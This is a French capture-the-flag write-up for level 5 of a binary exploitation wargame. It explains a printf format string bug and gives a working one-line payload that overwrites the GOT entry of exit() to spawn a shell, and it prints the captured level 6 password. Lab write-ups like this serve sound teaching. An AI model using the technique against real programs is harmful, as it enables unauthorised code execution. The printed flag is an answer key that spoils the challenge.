# Niveau 5 : Exploitation de Format String - Redirection du Flux d'Exécution

## Aperçu du Défi

Le niveau 5 introduit un nouveau défi : nous devons rediriger l'exécution du programme vers une fonction normalement inaccessible qui contient une exécution de shell.

## Analyse du Code Source

En utilisant Ghidra, nous avons extrait le code source du binaire :

```c
#include <stdio.h>
#include <stdlib.h>

void n(void);
void o(void);

void main(void)
{
    n();
    return;
}

void n(void)
{
    char buffer[520];

    fgets(buffer, 0x200, stdin);
    printf(buffer);
    exit(1);
}

void o(void)
{
    system("/bin/sh");
    _exit(1);
}
```

## La Vulnérabilité

La vulnérabilité se trouve dans la fonction `n()` qui transmet directement l'entrée utilisateur à `printf()` sans spécificateurs de format. Cela crée une vulnérabilité de type "format string" qui nous permet de lire et d'écrire en mémoire.

## Le Défi

En analysant le code, nous pouvons identifier :

1. La fonction `n()` lit l'entrée, la transmet à `printf()`, puis appelle `exit(1)`
2. La fonction `o()` nous donnerait un shell avec `system("/bin/sh")`, mais n'est jamais appelée dans le flux normal du programme
3. Comme `n()` appelle `exit(1)` et non `return`, nous ne pouvons pas utiliser un débordement de tampon traditionnel pour rediriger l'exécution

## Adresses Mémoire Clés

En utilisant gdb, nous avons identifié l'adresse suivante :

- Adresse de la fonction `o()` : `0x080484a4` (adresse de sa première instruction)

```bash
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
```

- Adresse de la fonction `exit()` : `0x8049838` (adresse de l'instruction de saut dans la GOT)

```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
```

Nous déterminons l'entrée GOT pour `exit()` en examinant son entrée PLT - l'instruction `jmp *0x8049838` montre que le programme saute à l'adresse stockée à 0x8049838, qui est l'entrée GOT contenant l'adresse réelle de la fonction `exit()`.

## La Stratégie d'Exploitation

Comme nous ne pouvons pas déborder le tampon pour modifier une adresse de retour (il n'y en a pas), nous avons besoin d'une approche différente. L'idée clé est que nous pouvons réécrire l'entrée GOT (Global Offset Table) pour `exit()` afin de rediriger l'exécution.

### Comprendre la GOT

La Global Offset Table (GOT) est une partie critique des exécutables liés dynamiquement :

- Elle contient les adresses mémoire des fonctions chargées depuis des bibliothèques externes (comme libc)
- Lorsqu'un programme appelle une fonction externe comme `exit()`, il utilise l'adresse stockée dans la GOT
- Ces adresses sont stockées dans une section de mémoire inscriptible, ce qui en fait des cibles d'exploitation

En réécrivant l'entrée GOT pour `exit()`, nous pouvons la faire pointer vers `o()` au lieu de la véritable fonction `exit()`, détournant ainsi efficacement le flux d'exécution du programme.

### Approche d'Attaque par Format String

Nous utiliserons la vulnérabilité de format string pour :

1. Placer l'adresse GOT de `exit()` au début de notre entrée
2. Utiliser la fonctionnalité d'accès direct aux paramètres pour faire écrire printf à cette adresse
3. Écrire l'adresse de la fonction `o()` (0x080484a4) dans l'entrée GOT

### 1. Déterminer les Positions des Paramètres

Pour trouver où notre adresse est positionnée dans la liste des paramètres de printf, nous exécutons :

```bash
(python -c 'print "\x38\x98\x04\x08" + "%p %p %p %p"') | ./level5
0x200 0xb7fd1ac0 0xb7ff37d0 0x8049838
```

Cela montre que notre adresse cible (0x8049838) est en position 4.

### 2. L'Exploit Complet

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"'; cat) | ./level5
```

Cette commande :

1. Place l'adresse (0x08049838) au début de notre entrée
2. Utilise `%134513824c` pour imprimer exactement 134 513 824 caractères (équivalent décimal de 0x080484a4)
3. Le `%4$n` écrit ce compteur dans le 4ème argument, qui est notre entrée GOT
4. Maintient stdin ouvert avec `cat` pour que nous puissions interagir avec le shell une fois qu'il est lancé

Lorsque l'exploit s'exécute, le programme appellera `exit(1)`, mais au lieu de sauter vers la vraie fonction `exit()`, il sautera vers notre fonction `o()`, qui nous donne un shell.

Avec le shell, nous pouvons lire le mot de passe pour le niveau 6 :

```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Observations Sur \_exit() vs exit()

Un détail intéressant est que `o()` utilise `_exit(1)` au lieu de `exit(1)`. C'est important car :

1. Si `o()` avait utilisé `exit(1)`, nous aurions créé une boucle infinie lorsque l'entrée GOT est réécrite
2. Comme `_exit()` est une fonction différente avec sa propre entrée GOT, nous évitons ce problème
3. Cela permet à notre exploit d'exécuter proprement le shell puis de se terminer
